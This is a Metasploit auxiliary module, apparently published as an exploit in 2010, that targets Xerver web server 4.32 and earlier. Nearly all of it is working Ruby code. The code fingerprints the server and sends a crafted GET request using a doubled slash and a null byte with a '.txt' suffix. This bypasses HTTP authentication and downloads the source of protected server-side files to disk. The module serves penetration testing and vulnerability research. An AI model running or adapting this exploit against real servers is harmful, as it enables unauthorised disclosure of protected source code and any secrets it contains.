# Exploit Title: Xerver Source Disclosure and HTTP Auth Bypass
# Date: 01 Aug 2010
# Author: Ben Schmidt aka supernothing
# Software: http://www.javascript.nu/xerver/
# Version: 4.32 and prior
# Tested on: Windows XP SP3
# CVE: N/A
 
 
##
# This file is derived from part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
 
    def initialize
        super(
            'Name'           => 'Xerver Source Code Disclosure/Download, Authentication Bypass',
            'Version'        => '$Revision: 1 $',
            'Description'    => %q{
                    This module exploits a source code disclosure/download vulnerability in
                versions of the Xerver web server up to and including version 4.32. It also
                incorporates an authentication bypass vulnerability that allows you to dump
                the source of files in HTTP auth protected directories as well.
            },
            'References'     =>
                [
                    [ 'CVE', '' ],
                    [ 'OSVDB', '' ],
                    [ 'BID', '' ],
                    ['URL','http://spareclockcycles.org/2010/08/01/multiple-vulnerabilities-in-xerver-4-32/']
                ],
            'Author'         =>
                [
                    #Vulnerability discovered by:
                    'supernothing',
                    #Module based on nginx source disclosure code by:
                    'Alligator Security Team',
                    'Tiago Ferreira <tiago.ccna[at]gmail.com>',
                ],
            'License'        =>  MSF_LICENSE)
 
        register_options(
            [
                OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
                OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
            ], self.class)
    end
 
    def target_url
        "http://#{vhost}:#{rport}#{datastore['URI']}"
    end
 
    def run_host(ip)
        uri = datastore['URI']
        path_save = datastore['PATH_SAVE']
 
        vuln_versions = [
            "Xerver/4.32",#Others definitely vulnerable, add as needed
        ]
 
        begin
            res = send_request_raw(
                {
                    'method'  => 'GET',
                    'uri'     => "//#{uri}\x00.txt", #extra forward slash for breaking password protection
                }, 25)
 
            if res
                version = res.headers['Server']
                http_fingerprint({ :response => res })
            end
             
            if vuln_versions.include?(version)
                print_good("#{target_url} - Xerver - Vulnerable version: #{version}")
 
                if (res and res.code == 200)
 
                    print_good("#{target_url} - Xerver - Getting the source of page #{uri}")
 
                    save_source = File.new("#{path_save}#{uri}","w")
                    save_source.puts(res.body.to_s)
                    save_source.close
 
                    print_status("#{target_url} - Xerver - File successfully saved: #{path_save}#{uri}")    if (File.exists?("#{path_save}#{uri}"))
 
                else
                    print_error("http://#{vhost}:#{rport} - Xerver - Unrecognized #{res.code} response")
                    return
 
                end
 
            else
                if version =~ /Xerver/
                    print_error("#{target_url} - Xerver - Cannot exploit: the remote server is not vulnerable - Version #{version}")
                else
                    print_error("#{target_url} - Xerver - Cannot exploit: the remote server is not Xerver")
                end
                return
 
            end
 
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
    end
 
end